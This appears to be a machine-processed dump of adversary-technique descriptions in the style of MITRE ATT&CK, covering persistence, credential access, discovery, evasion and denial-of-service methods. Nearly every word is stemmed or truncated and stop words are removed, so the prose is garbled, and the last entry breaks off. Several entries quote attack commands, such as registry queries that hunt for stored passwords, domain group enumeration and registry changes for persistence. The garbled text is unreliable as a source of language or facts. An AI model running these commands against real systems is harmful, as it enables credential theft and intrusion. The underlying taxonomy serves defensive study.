advers comprom soc med account us target op incorp soc engin util onlin person import rath cre cult soc med profil i.e soc med account http advers comprom ex soc med account util ex person engend level trust pot victim rel knowledg comprom person vary method ex comprom soc med account gath cred via phish inform http purchas cred third-party sit brut forc cred ex password reus breach cred dump anonhbg pri comprom soc med account advers conduc reconnaiss inform decid account comprom op person ex singl sit across multipl sit ex facebook linkedin twit etc. comprom soc med account requir addit develop could includ fil mod profil inform develop soc network incorp photo advers us comprom soc med profil cre new hijack ex connect target interest connect direct includ try connect oth newscaster2014 blackhatrobins comprom profil lev phas advers lifecyc init access ex spearph via serv http
apply access tok
advers us apply access tok bypass typ auth process access restrict account inform serv remot system tok typ ste us us lieu login cred apply access tok us mak auth ap request behalf us common us way access resourc cloud-bas apply software-as-a-servic saa auth0 - alway us access tok sec ap sept 2019 oau on common impl framework issu tok us access system framework us collab ver us determin act us allow perform id est tok allow act auth without pass act cred us theref comprom tok grant advers access resourc sit malicy apply okt exampl cloud-bas email serv oau access tok grant malicy apply pot gain long-term access feat us account refresh tok en background access award microsoft id platform access 2019 oau access tok advers us user-granted rest ap perform funct email search contact enum staaldraad phish oau 2017 comprom access tok us init step comprom serv exampl tok grant access victim ’ prim email advers abl extend access serv target subscrib trig forget password routin direct ap access tok neg effect second auth fact immun intuit countermeas lik chang password access abus ap channel difficult detect ev serv provid end access stil align wel legitim workflow
saf mod boot
advers abus window saf mod dis endpoint defens saf mod start window op system limit set driv serv third-party sec softw endpoint detect respons edr tool start boot window saf mod two vert saf mod saf mod saf mod network poss start addit serv saf mod boot microsoft saf mod sopho snatch ransomw 2019 advers abus saf mod dis endpoint defens start limit boot host forc saf mod next reboot via mod boot config dat bcd stor fil man boot apply set microsoft bcdedit 2021 advers also ad malicy apply list minim serv start saf mod mod relev reg valu i.e mod reg http malicy compon object model http com object also reg load saf mod sopho snatch ransomw 2019 cyberark lab saf mod 2016 cybereason nocturn medusalock 2020 bleepingcomput revil 2021
screensaver
screensavers program execut config tim us inact consist port execut pe fil .scr fil extend wikiped screensaver window screensaver apply scrnsave.scr loc < cod > c \windows\system32\ < /code > < cod > c \windows\syswow64\ < /code > 64-bit window system along screensavers includ bas window instal follow screensaver set stor reg < cod > hkcu\control panel\desktop\ < /code > could manip achiev persist < cod > scrnsave.exe < /code > - set malicy pe path < cod > screensaveactive < /code > - set ' 1 ' en screensaver < cod > screensaverissecure < /code > - set ' 0 ' requir password unlock < cod > screensavetimeout < /code > - set us inact timeout screensaver execut advers us screensaver set maintain persist set screensaver run malw certain timefram us inact eset gaz aug 2017
tftp boot
advers abus netboot load unauth network dev op system triv fil transf protocol tftp serv tftp boot netboot common us network admin load configuration-controlled network dev im cent man serv netboot on opt boot sequ us cent man control dev im advers manip config network dev spec us malicy tftp serv us conjunct mod system im http load mod im dev startup reset unauth im allow advers mod dev config ad malicy cap dev introduc backdo maintain control network dev minim detect us standard funct techn simil rommonkit http result network dev run mod im cisco blog leg dev attack
window serv
advers cre mod window serv rep execut malicy payload part persist window boot start program apply cal serv perform background system funct technet serv window serv config inform includ fil path serv execut recovery programs/command stor window reg advers instal new serv mod ex serv execut startup ord persist system serv config set mod us system util sc.exe direct mod reg interact direct window ap advers also us serv instal execut malicy driv exampl drop driv fil ex ` .sys ` disk payload load reg via nat ap http funct ` createservicew ` man via funct ` zwloaddriver ` ` zwsetvaluekey ` cre requir serv reg valu i.e mod reg http us command-line util ` pnputil.exe ` symantec w.32 stuxnet dossy crowdstrik driveslay febru 2022 unit42 acidbox jun 2020 advers lev driv rootkit http hid pres malicy act system advers also load sign yet vuln driv onto comprom machin know bring vuln driv byovd part exploit privileg esc http eset invisimol jun 2020 unit42 acidbox jun 2020 serv cre admin privileg execut system privileg advers also us serv esc privileg advers also direct start serv serv execut http mak detect analys challeng malicy serv also incorp masquerad task serv http ex us serv and/or payload nam rel legitim o benign softw compon
fast flux dns
advers us fast flux dns hid command control channel behind array rapid chang ip address link singl domain resolv techn us ful qual domain nam multipl ip address assign swap high frequ us combin round robin ip address short time-to-liv ttl dns resourc record mehtafastfluxpt1 mehtafastfluxpt2 fast flux - welivesec simplest single-flux method involv reg de-registering address part dns address record list singl dns nam reg five-minut av lifesp result const shuffl ip address resolv fast flux - welivesec contrast double-flux method reg de-registers address part dns nam serv record list dns zon provid addit resy connect double-flux addit host act proxy c2 host ins tru sourc c2 channel
system check
advers employ vary system check detect avoid virt analys environ includ chang behavy bas result check pres artifact ind virt machin environ vme sandbox advers detect vme alt malw diseng victim cont cor funct impl also search vme artifact drop second addit payload advers us inform learn virtualization/sandbox evas http autom discovery shap follow-on behavy deloit environ aw spec check vary bas target and/or advers involv behavy window man instru http powershel http system inform discovery http query reg http obtain system inform search vme artifact advers search vme artifact mem process fil system hardw and/or reg advers us script autom check on script program exit determin system virt environ check could includ gen system property host/domain nam sampl network traff advers also check network adapt address cpu cor count avail memory/drive siz common check enum serv run un apply inst program system manufacturer/product field string rel virt machin apply vme-specific hardware/processor instruct mcaf virt jan 2017 apply lik vmware advers also us spec i/o port send command receiv output hardw check pres fan temp audio dev could also us gath evid ind virt environ advers also query spec read dev unit 42 oilrig sept 2018
cron
advers abus < cod > cron < /code > util perform task schedule init rec execut malicy cod 20 maco common tool techn < cod > cron < /code > util time-based job scheduler unix-like op system < cod > crontab < /code > fil contain schedule cron entry run spec tim execut < cod > crontab < /code > fil stor op system-specific fil path advers us < cod > cron < /code > linux unix environ execut program system startup schedule bas persist http
domain group
advers attempt find domain-level group permit set knowledg domain-level permit group help advers determin group ex us belong particul group advers us inform determin us elev permit domain admin command < cod > net group /domain < /code > net http util < cod > dscacheutil -q group < /code > maco < cod > ldapsearch < /code > linux list domain-level group
vuln
advers acquir inform vuln us target vuln weak comput hardw softw pot exploit advers caus unintend unanticip behavy occ advers find vuln inform search op databas gain access clos vuln databas nat vuln databas advers monit vuln disclosures/database understand stat ex wel new discov vuln us delay vuln discov mak publ advers target system know conduc vuln research includ commerc vend knowledg vuln caus advers search ex exploit i.e exploit http attempt develop on i.e exploit http
spearph link
advers send spearph email malicy link attempt gain access victim system spearph link spec vary spearph diff form spearph employ us link download malw contain email instead attach malicy fil email avoid defens inspect email attach spearph also involv soc engin techn pos trust sourc form spearph electron del soc engin target spec individ company industry cas malicy email contain link gen link accompany soc engin text requir us act click cop past url brows lev us execut http visit websit comprom web brows us exploit us prompt download apply docu zip fil ev execut depend pretext email first plac advers also includ link intend interact direct email read includ emb im intend exploit end system direct ver receipt email i.e web bugs/web beacon addit advers us seem benign link abus spec charact mim legitim websit know idn homograph attack cis idn st05-016 advers also util link perform cons phish typ oau 2.0 request url acceiv us provid permissions/access malicy apply allow advers ste apply access tok http s. trend micro pawn storm oau 2017 ste access tok allow advers perform vary act behalf us via ap cal microsoft oau 2.0 cons phish 2021
startup item
per appl ’ docu startup item execut fin phas boot process contain shel script execut fil along config inform us system determin execut ord startup item startup item techn deprec vert supers launch daemon thu appropry fold < cod > /library/startupitems < /code > ’ guar ex system default appear ex default maco sierr startup item direct whos execut config property list plist < cod > startupparameters.plist < /code > resid top-level direct advers cre appropry folders/file startupitem direct reg persist mech method mac malw persist addit sint startupitem run bootup phas maco run root advers abl mod ex startup item abl privileg esc wel
clear linux mac system log
advers clear system log hid evid intrud maco linux keep track system user-initiated act via system log maj nat system log stor < cod > /var/log/ < /code > direct subfold direct categ log rel funct linux log < cod > /var/log/messages < /code > gen system-related mess < cod > /var/log/secure < /code > < cod > /var/log/auth.log < /code > auth log < cod > /var/log/utmp < /code > < cod > /var/log/wtmp < /code > login record < cod > /var/log/kern.log < /code > kernel log < cod > /var/log/cron.log < /code > crond log < cod > /var/log/maillog < /code > mail serv log < cod > /var/log/httpd/ < /code > web serv access er log
apply system exploit
advers exploit softw vuln caus apply system crash deny avail us sucur bind9 august 2015 system autom restart crit apply serv crash occ lik re-exploited caus persist den serv do condit advers exploit know zero-day vuln crash apply and/or system also lead depend apply and/or system do condit crash restart apply system also effect dat destruct http firmw corrupt http serv stop http etc caus do condit deny avail crit inform apply and/or system
off apply startup
advers lev microsoft office-based apply persist startup microsoft off fair common apply suit windows-based op system within enterpr network multipl mech us off persist office-based apply start includ us off templ macro add-in vary feat discov outlook abus obtain persist outlook rul form hom pag sensepost rul github persist mech work within outlook us off 365 technet o365 outlook rul
installutil
advers us installutil proxy execut cod trust window util installutil command-line util allow instal uninstal resourc execut spec instal compon spec .net bin msdn installutil installutil bin also digit sign microsoft loc .net direct window system < cod > c \windows\microsoft.net\framework\v < vert > \installutil.exe < /code > < cod > c \windows\microsoft.net\framework64\v < vert > \installutil.exe < /code > installutil also us bypass apply control us attribut within bin execut class dec attribut < cod > system.componentmodel.runinstaller tru < /code > lolba installutil
spearph link
advers send spearph mess malicy link elicit sensit inform us target spearph inform attempt trick target divulg inform frequ cred act inform spearph inform frequ involv soc engin techn pos sourc reason collect inform ex est account http comprom account http and/or send multipl seem urg mess form spearph electron del soc engin target spec individ company industry scenario malicy email contain link gen accompany soc engin text coax us act click cop past url brows trendmictro phish pcmag fakelogin giv websit clon legitim sit onlin corp login port clos resembl legitim sit appear url contain el real sit fak websit inform gath web form send advers advers also us inform prevy reconnaiss effort ex search op websites/domain http search victim-owned websit http craft persuas believ lur
ssh
advers us valid account http log remot machin us sec shel ssh advers perform act logged-on us ssh protocol allow auth us op remot shel comput many linux maco vert com ssh inst default although typ dis us en ssh serv config us standard password auth public-private keypair lieu addit password auth scenario us ’ publ key must spec fil comput run serv list keypair allow login us
addit cloud rol
advers ad addit rol permit adversary-controlled cloud account maintain persist access ten exampl advers upd iam policy cloud-bas environ ad new glob admin off 365 environ aw iam policy permit googl cloud iam policy microsoft support o365 ad anoth admin octob 2019 microsoft o365 admin rol sufficy permit comprom account gain almost unlimit access dat set includ abl reset password admin expel aw attack microsoft o365 admin rol account mod immedy follow cre account http malicy account act advers also mod ex valid account http comprom could lead privileg esc particul rol ad allow lat mov addit account exampl az ad environ advers apply admin rol ad addit cloud cred http apply serv princip advers would abl gain serv princip ’ rol permit diff apply admin specterop az privileg esc simil aw environ advers appropry permit abl us < cod > createpolicyvert < /code > ap defin new vert iam policy < cod > attachuserpolicy < /code > ap attach iam policy addit distinct permit comprom us account rhino sec lab aw privileg esc simil advers az ad glob admin rol toggl “ access man az resourc ” opt gain abl assign privileg access az subscrib virt machin az ad us includ az ad ad
print process
advers abus print process run malicy dlls system boot persist and/or privileg esc print process dlls load print spool serv spoolsv.exe boot advers abus print spool serv ad print process load malicy dlls startup print process inst < cod > addprintprocess < /code > ap cal account < cod > seloaddriverprivileg < /code > en altern print process reg print spool serv ad < cod > hklm\system\\ currentcontrolset controlset001 \control\print\environments\\ window architect window x64 \print processors\\ us defin \driver < /code > reg key point dll print process correct inst must loc system print-processor direct find < cod > getprintprocessordirect < /code > ap cal microsoft addprintprocess 2018 print process inst print spool serv start boot must restart ord run eset pipemon 2020 print spool serv run system level permit theref print process inst advers run elev privileg
dis sec tool
advers dis sec tool avoid poss detect tool act tak form kil sec softw ev log process delet reg key tool start run tim method interf sec scan ev report
disk structure wip
advers corrupt wip disk dat structure hard driv necess boot system target spec crit system wel larg numb system network interrupt avail system network resourc advers attempt rend system un boot overwrit crit dat loc structure mast boot record mbr partit tabl symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017 unit 42 shamoon3 2018 dat contain disk structure includ init execut cod load op system loc fil system partit disk inform pres comput abl load op system boot process leav comput unavail disk structure wip http perform isol along disk cont wip http sect disk wip maxim impact target org malw design destroy disk structure worm-like feat prop across network lev techn lik valid account http o cred dump http window admin shar http symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017
spearph attach
advers send spearph email malicy attach attempt gain access victim system spearph attach spec vary spearph spearph attach diff form spearph employ us malw attach email form spearph electron del soc engin target spec individ company industry scenario advers attach fil spearph email us rely upon us execut http gain execut spearph also involv soc engin techn pos trust sourc many opt attach microsoft off docu execut pdfs arch fil upon op attach pot click past protect advers payload exploit vuln direct execut us system text spearph email us try giv plaus reason fil op explain bypass system protect ord email also contain instruct decrypt attach zip fil password ord evad email bound defens advers frequ manip fil extend icon ord mak attach execut appear docu fil fil exploit on apply appear fil diff on
cred reg
window reg stor config inform us system program advers query reg look cred password stor us program serv sometim cred us autom logon exampl command find reg key rel password inform pentestlab stor cred loc machin hiv < cod > reg query hklm /f password /t reg_sz /s < /code > cur us hiv < cod > reg query hkcu /f password /t reg_sz /s < /code >
strip payload
advers attempt mak payload difficult analys remov symbol string hum read inform script execut contain vary nam string help develop docu cod funct symbol oft cre op system ’ ` link ` execut payload compil revers engin us symbol string analys cod ident funct payload mandy golang strip bin expl intez strip bin elf fil 2018 advers us strip payload ord mak malw analys difficult exampl compil tool provid feat remov obfusc string symbol advers also us strip payload form run-only applescrib compil strip vert applescrib http evad detect analys lack human-readable inform direct hind detect analys payload sentinellab revers run-only applescrib 2021
compon object model
advers us window compon object model com loc cod execut com inter-process commun ipc compon nat window apply program interfac ap en interact softw object execut cod impl on interfac fireey hunt com jun 2019 com cli object cal method serv object typ bin dynam link libr dll execut ex microsoft com remot com execut facilit remot serv http distribut compon object model http dcom fireey hunt com jun 2019 vary com interfac expos abus invok arbit execut via vary program langu c c++ jav vis bas http microsoft com spec com object also ex direct perform funct beyond cod execut cre schedule task/job http fileless download/execution advers behavy rel privileg esc persist fireey hunt com jun 2019 projectzero fil writ eop apr 2018
dll search ord hijack
advers execut malicy payload hijack search ord us load dlls window system us common method look requir dlls load program microsoft dynam link libr search ord fireey hijack july 2010 hijack dll load purpos est persist wel elev privileg and/or evad restrict fil execut many way advers hijack dll load advers plant trod dynamic-link libr fil dlls direct search loc legitim libr request program caus window load malicy libr cal victim program advers also perform dll preload also cal bin plant attack owasp bin plant plac malicy dll nam ambigu spec dll loc window search legitim dll oft loc cur work direct program fireey fxsst jun 2011 remot dll preload attack occ program set cur direct remot loc web shar load dll microsoft sec adv 2269637 advers also direct mod search ord via dll redirect en reg cre redirect fil caus program load diff dll microsoft dynamic-link libr redirect microsoft manifest fireey dll search ord hijack search order-vulnerable program config run high privileg level adversary-controlled dll load also execut high level cas techn could us privileg esc us admin system admin system depend program program fal victim path hijack appear behav norm malicy dlls config also load legitim dlls mean replac
autom collect
est within system network advers us autom techn collect intern dat method perform techn could includ us command script interpret http search cop inform fit set crit fil typ loc nam spec tim interv cloud-bas environ advers also us cloud ap command lin interfac extract transform load etl serv autom collect dat funct could also build remot access tool techn incorp us techn fil direct discovery http lat tool transf http ident mov fil wel cloud serv dashboard http cloud stor object discovery http ident resourc cloud environ
clipboard dat
advers collect dat stor clipboard us cop inform within apply window apply access clipboard dat us window ap msdn clipboard osx provid nat command < cod > pbpaste < /code > grab clipboard cont op empyr
proc filesystem
advers gath cred inform stor proc filesystem < cod > /proc < /code > proc filesystem linux contain gre deal inform regard stat run op system process run root privileg us facil scrape liv mem run program program stor password clear text password hash mem valu harvest eith us brut forc attack respect funct impl mimipenguin mimipenguin github 2017 op sourc tool inspir mimikatz tool dump process mem harvest password hash look text string regex pattern giv apply gnom keyr sshd apach us mem stor auth artifact
botnet
advers buy leas rent network comprom system us target botnet network comprom system instruct perform coordin task norton botnet advers purchas subscrib us ex botnet booter/stress serv botnet dispos advers perform follow-on act large-scal phish http distribut den serv ddo imperv ddo hir krebs-anna krebs-bazaar krebs-booter
password man
advers acquir us cred third-party password man is password man febru 2019 password man apply design stor us cred norm encrypt databas cred typ access us provid mast password unlock databas databas unlock cred cop mem databas stor fil disk is password man febru 2019 advers acquir us cred password man extract mast password and/or plain-text cred mem foxit wocao decemb 2019 github keethief advers extract cred mem via exploit cred access http nvd cve-2019-3610 advers also try brut forc via password guess http obtain mast password password man cyberreason anch decemb 2019
appinit dlls
dynamic-link libr dlls spec appinit_dlls valu reg key < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\windows < /code > < cod > hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows < /code > load user32.dll every process load user32.dll pract near every program sint user32.dll common libr elast process inject july 2017 simil process inject http valu abus obtain persist privileg esc caus malicy dll load run context sep process comput appinit reg appinit dll funct dis window 8 lat vert sec boot en appinit sec boot
gatekeep bypass
advers mod fil attribut subvert gatekeep funct evad us prompt execut untrust program gatekeep set technolog act lay appl ’ sec model ens trust apply execut host gatekeep build top fil quarantin snow leopard 10.6 2009 grow includ cod sign sec policy comply not gatekeep also tre apply run first tim diff reop apply theeclecticlightcompany quarantin flag theeclecticlightcompany appl not bas opt-in system fil download extend attribut xat cal ` com.apple.quarantine ` also know quarantin flag set fil apply perform download launch serv op apply suspend stat first run apply quarantin flag set gatekeep execut follow funct 1. check extend attribut – gatekeep check quarantin flag provid alert prompt us allow deny execut oceanlot o x 20 maco common tool techn 2. check system policy - gatekeep check system sec policy allow execut ap download eith ap stor ap stor ident develop 3. cod sign – gatekeep check valid cod sign appl develop id 4. not - us ` api.apple-cloudkit.com ` ap gatekeep reach appl serv ver pul not ticket ens ticket revok us overrid not result prompt execut “ unauth ap ” sec policy mod advers subvert on multipl sec control within gatekeep check log er e.g exploit defens evas http uncheck fil typ extern libr exampl pri maco 13 ventur cod sign not check conduc first launch allow advers writ malicy execut prevy op apply ord bypass gatekeep sec check theevilbit gatekeep bypass 2021 apply bundl manip brandon dalton apply fil load onto system usb flash driv opt disk extern hard driv driv shar loc network us curl command set quarantin flag addit poss avoid set quarantin flag us drive-by comprom http
drive-by target
advers prep op environ infect system visit websit norm cours brows endpoint system comprom brows advers control sit drive-by comprom http cas us web brows typ target exploit oft requir extr us interact land sit advers also set websit non-exploitat behavy apply access tok http pri drive-by comprom http advers must stag resourc nee del exploit us brows advers control sit drive-by cont stag advers control infrastruct acquir acquir infrastruct http prevy comprom comprom infrastruct http advers upload inject malicy web cont javascrib http websit fireey cfr wat hol 2012 gallagh 2015 do numb way includ insert malicy script web pag us control web cont for post advers also craft malicy web advert purchas ad spac websit legitim ad provid addit stag cont exploit us web brows advers also stag script cont profil us brows gath victim host inform http ens vuln pri attempt exploit scanbox websit comprom advers us stag drive-by on visit spec commun govern particul industry reg goal comprom spec us set us bas shar interest kind target campaign ref strategic web comprom wat hol attack advers purchas domain simil legitim domain ex homoglyph typosquat diff top-level domain etc acquisit infrastruct domain http help facilit drive-by comprom http
system serv discovery
advers try gath inform reg loc system serv advers obtain inform serv us tool wel o util command < cod > sc query < /code > < cod > taskl /svc < /code > < cod > systemctl -- type=servic < /code > < cod > net start < /code > advers us inform system serv discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act
network sniff
advers sniff network traff capt inform environ includ auth mat pass network network sniff ref us network interfac system monit capt inform send wir wireless connect advers plac network interfac promiscu mod pass access dat transit network us span port capt larg amount dat dat capt via techn includ us cred espec send insec unencrypt protocol techn nam serv resolv poison llmnr/nbt-ns poison smb relay http also us capt cred websit proxy intern system redirect traff advers network sniff also rev config detail run serv vert numb network charact e.g ip address hostnam vlan id necess subsequ lat mov and/or defens evas act cloud-bas environ advers stil abl us traff mir serv sniff network traff virt machin exampl aw traff mir gcp packet mir az vtap allow us defin spec inst collect traff spec target send collect traff aw traff mir gcp packet mir az virt network tap oft much traff cleartext due us tl termin load bal level reduc strain encrypt decrypt traff rhino sec lab aw vpc traff mir specterop aw traff mir advers us exfilt techn transf dat cloud account ord access sniff traff rhino sec lab aw vpc traff mir
apply deploy softw
advers deploy malicy softw system within network us apply deploy system employ enterpr admin permit requir act vary system config loc cred sufficy direct access deploy serv spec domain cred requir howev system requir admin account log perform softw deploy access network-wide enterprise-wid softw deploy system en advers remot cod execut system connect system access us lat mov system gath inform caus spec effect wip hard driv endpoint
cod sign
advers cre acquir ste cod sign mat sign malw tool cod sign provid level auth bin develop guar bin tamp wikiped cod sign cert us op cre acquir ste advers securel digit cert symantec digit cert unlik invalid cod sign http act result valid sign cod sign ver softw first run us modern window maco system us linux due dec nat platform wikiped cod sign eclecticlightchecksonexecodesign cod sign cert us bypass sec policy requir sign cod execut system
dat cloud stor
advers access dat improp sec cloud stor many cloud serv provid off solv onlin dat object stor amazon s3 az stor googl cloud stor solv diff stor solv sql elasticsearch overarch apply dat solv retriev direct us cloud provid ap cas saa apply provid slack conflu salesforc also provid cloud stor solv periph us cas platform cloud object extract direct assocy apply ea hack via slack - jun 2021 secureworld - sec slack channel - dec 2021 hackernew - 3 saa ap cyb attack - april 2022 dark clouds_usenix_mulazzani_08_2011 advers collect sensit dat cloud stor solv provid typ off sec guid help end us config system though misconfig common problem amazon s3 sec 2019 microsoft az stor sec 2019 googl cloud stor best pract 2019 num incid cloud stor improp sec typ unint allow publ access unauth us overly-broad access us ev access anonym person outsid control id access man system without ev nee bas us permit op access expos vary typ sensit dat credit card person ident inform med record trend micro s3 expos pii 2017 wir magecart s3 bucket 2019 hipa journ s3 breach 2017 rclone-mega-extortion_05_2021 advers also obtain abus leak cred sourc reposit log mean way gain access cloud stor object
runtim dat manip
advers mod system ord manip dat access display end us thu threaten integr dat fireey apt38 oct 2018 doj lazar sony 2018 manip runtim dat advers attempt affect busy process org understand decid mak advers alt apply bin us display dat ord caus runtim manip advers also conduc chang default fil assocy http masquerad http caus simil effect typ mod impact depend target apply process wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
cred reg
advers search reg comprom system insec stor cred window reg stor config inform us system program advers query reg look cred password stor us program serv sometim cred us autom logon exampl command find reg key rel password inform pentestlab stor cred loc machin hiv < cod > reg query hklm /f password /t reg_sz /s < /code > cur us hiv < cod > reg query hkcu /f password /t reg_sz /s < /code >
network shar discovery
advers look fold driv shar remot system mean ident sourc inform gath precurs collect ident pot system interest lat mov network oft contain shar network driv fold en us access fil direct vary system across network fil shar window network occ smb protocol wikiped shar resourc technet shar fold net http us query remot system avail shar driv us < cod > net view \\\\remotesystem < /code > command also us query shar driv loc system us < cod > net shar < /code > maco < cod > shar -l < /code > command list shar point us smb serv
periph dev discovery
advers attempt gath inform attach periph dev compon connect comput system periph discovery linux periph discovery maco periph dev could includ auxy resourc support vary funct keyboard print camer smart card read remov stor inform us enh aw system network environ us act
network topolog
advers gath inform victim network topolog us target inform network topolog includ vary detail includ phys and/or log arrang external-facing intern network environ inform also includ spec regard network dev gateway rout etc infrastruct advers gath inform vary way direct collect act via act scan http phish inform http inform network topolog also expos advers via onlin access dat set ex search victim-owned websit http dns dumpst gath inform rev opportun form reconnaiss ex search op techn databas http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http
cod sign cert
advers cre self-signed cod sign cert us target cod sign process digit sign execut script confirm softw auth guar cod alt corrupt cod sign provid level auth program develop guar program tamp wikiped cod sign us and/or sec tool trust sign piec cod unsign piec cod ev n't know issu cert auth pri cod sign http advers develop self-signed cod sign cert us op
window fil direct permit mod
advers mod fil direct permissions/attribute evad access control list ac access protect fil hybrid analys icacls1 jun 2018 hybrid analys icacls2 2018 fil direct permit common man ac config fil direct own us appropry permit fil direct ac impl vary platform gen explicit design us group perform act read writ execut etc. window impl fil direct ac discret access control list dac microsoft dac 2018 simil standard ac dac ident account allow deny access sec object attempt mak access sec object system check access control entry dac ord match entry find access object grant otherw access deny microsoft access control list 2018 advers interact dac us built-in window command ` icac ` ` cac ` ` takeown ` ` attrib ` grant advers high permit spec fil fold powershel http provid cmdlets us retriev mod fil direct dac spec fil direct mod requir step many techn est persist via access feat http boot logon init script http tainting/hijack instru binary/configuration fil via hijack execut flow http
add-in
advers abus microsoft off add-in obtain persist comprom system off add-in us ad funct off program microsoft off add-in diff typ add-in us vary off produc includ word/excel add-in libr wll/xll vba add-in off compon object model com add-in autom add-in vba edit vbe vis studio tool off vsto add-in outlook add-in mrwlabs off persist add-in fireey mail cd 2018 add-in us obtain persist set execut cod off apply start
transport ag
advers abus microsoft transport ag est persist access system microsoft exchang transport ag op email mess pass transport pipelin perform vary task filt spam filt malicy attach journ ad corp sign end outgo email microsoft transport jun 2016 eset lightneuron 2019 transport ag writ apply develop compil .net assembl subsequ reg exchang serv transport ag invok spec stag email process carry develop defin task advers reg malicy transport ag provid persist mech exchang serv trig adversary-specified email ev eset lightneuron 2019 though malicy transport ag invok email pass exchang transport pipelin ag config carry spec task respons advers defin crit exampl transport ag carry act lik cop in-transit attach sav lat exfilt recipy email address match entry list provid advers
system inform discovery
advers attempt get detail inform op system hardw includ vert patch hotfix serv pack architect advers us inform system inform discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act tool systeminfo http us gath detail system inform run privileg access breakdown system dat gath < cod > systemsetup < /code > config tool maco exampl advers user-level access execut < cod > df -ah < /code > command obtain cur mount disk assocy fre avail spac advers also lev network dev cli http network dev gath detail system inform e.g < cod > show vert < /code > us-cert-ta18-106a system inform discovery http combin inform gath form discovery reconnaiss driv payload develop cont osx.fairytale 20 maco common tool techn infrastruct serv ia cloud provid aw gcp az allow access inst virt machin inform via ap success auth ap cal return dat op system platform stat particul inst model view virt machin amazon describ inst googl inst resourc microsoft virut machin ap
apply lay protocol
advers commun us apply lay protocol avoid detection/network filt blend ex traff command remot system oft result command emb within protocol traff cli serv advers util many diff protocol includ us web brows transf fil electron mail dns connect occ intern within enclav proxy pivot nod nod common us protocol smb ssh rdp
remot dat stag
advers stag dat collect multipl system cent loc direct on system pri exfilt dat keep sep fil combin on fil techn arch collect dat http interact command shel us common funct within cmd http bash us cop dat stag loc cloud environ advers stag dat within particul inst virt machin exfilt advers cre cloud inst http stag dat inst mandy m-trends 2020 stag dat on system pri exfilt advers minim numb connect mak c2 serv bet evad detect
schedule task/job
advers abus task schedule funct facilit init rec execut malicy cod util ex within maj op system schedule program script execut spec dat tim task also schedule remot system provid prop auth meet ex rpc fil print shar window environ schedule task remot system typ requir memb admin otherw privileg group remot system technet task scheduler sec advers us task schedule execut program system startup schedule bas persist mech also abus run process context spec account on elev permissions/privilege simil system bin proxy execut http advers also abus task schedule pot mask one-tim execut trust system process proofpoint serp
msiexec
advers abus msiexec.exe proxy execut malicy payload msiexec.exe command-line util window instal thu common assocy execut instal pack .msi microsoft msiexec msiexec.exe bin also digit sign microsoft advers abus msiexec.exe launch loc network access msi fil msiexec.exe also execut dlls lolba msiexec trendmicro msiexec feb 2018 sint sign nat window system msiexec.exe us bypass apply control solv account pot abus msiexec.exe execut also elev system privileg < cod > alwaysinstallelev < /code > policy en microsoft alwaysinstallelev 2018
login item
maco provid opt list spec apply run us log apply run log us context start every tim us log login item inst us serv man framework vis system pref remov apply cre ad login item us direct control login item inst us shar fil list also vis system pref ad login item login item stor us < cod > ~/library/preferences/ < /code > direct plist fil cal < cod > com.apple.loginitems.plist < /code > method mac malw persist apply op vis dialog us ’ sint opt ‘ hid ’ window advers reg login item mod ex on us execut cod persist mech tim us log malw persist o x osx.dok malw ap method < cod > smloginitemsetenabled < /code > us set login item script langu lik applescrib http wel ad login item
network trust depend
advers gath inform victim network trust depend us target inform network trust includ vary detail includ second third-party organizations/domain ex man serv provid contract etc connect pot elev network access advers gath inform vary way direct elicit via phish inform http inform network trust also expos advers via onlin access dat set ex search op techn databas http pentest ad forest gath inform rev opportun form reconnaiss ex act scan http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex trust rel http
reflect ampl
advers attempt caus den serv do reflect high-volume network traff target typ network do tak adv third-party serv intermedy host respond giv spoof sourc ip address third-party serv common term reflect advers accompl reflect attack send packet reflect spoof address victim simil direct network flood on system us conduc attack botnet us likew on reflect us foc traff target cloudfl reflectiondo 2017 network do attack also reduc avail funct target system network reflect attack oft tak adv protocol larg respons request ord ampl traff common know reflect ampl attack advers abl gen increas volum attack traff sev ord magnitud gre request send ampl ext increas depend upon many vary protocol quest techn us ampl serv act produc ampl attack volum two promin protocol en reflect ampl flood dns cloudfl dnsamplficationdos ntp cloudfl ntpamplifciationdos though us sev oth wild docu arb annualdosreport jan 2018 particul memcach protocol show pow protocol ampl siz 51,200 tim request packet cloudfl memcrash feb 2018
password filt dll
advers reg malicy password filt dynam link libr dlls auth process acquir us cred valid window password filt password policy enforc mech domain loc account filt impl dlls contain method valid pot password password policy filt dlls posit loc comput loc account and/or domain control domain account reg new password sec account man sam loc sec auth lsa request valid reg filt pot chang tak effect every reg filt acknowledg valid advers reg malicy password filt harvest cred loc comput and/or entir domain perform prop valid filt must receiv plain-text cred lsa malicy password filt would receiv plain-text cred every tim password request mak carn own password filt sept 2013
termin serv dll
advers abus compon termin serv en persist access system microsoft termin serv renam remot desktop serv window serv os 2022 en remot termin connect host termin serv allow serv transmit ful interact graph us interfac cli via rdp microsoft remot desktop serv window serv http run gen process ex < cod > svchost.exe < /code > load serv dll fil loc stor reg entry nam < cod > servicedl < /code > microsoft system serv funda < cod > termsrv.dll < /code > fil typ stor ` systemroot \system32\ ` default < cod > servicedl < /code > valu termin serv ` hklm\system\currentcontrolset\services\termservice\parameters\ ` advers mod and/or replac termin serv dll en persist access victim host jam termserv dll mod dll could do execut arbit payload also pot preserv norm < cod > termsrv.dll < /code > funct wel simply en abus feat termin serv exampl advers en feat concur remot desktop protocol http sess eith patch < cod > termsrv.dll < /code > fil mod < cod > servicedl < /code > valu point dll provid increas rdp funct window o hub rdp rdpwrap github non-server window o increas funct also en advers avoid termin serv prompt warn/log us system new rdp sess cre
applescrib
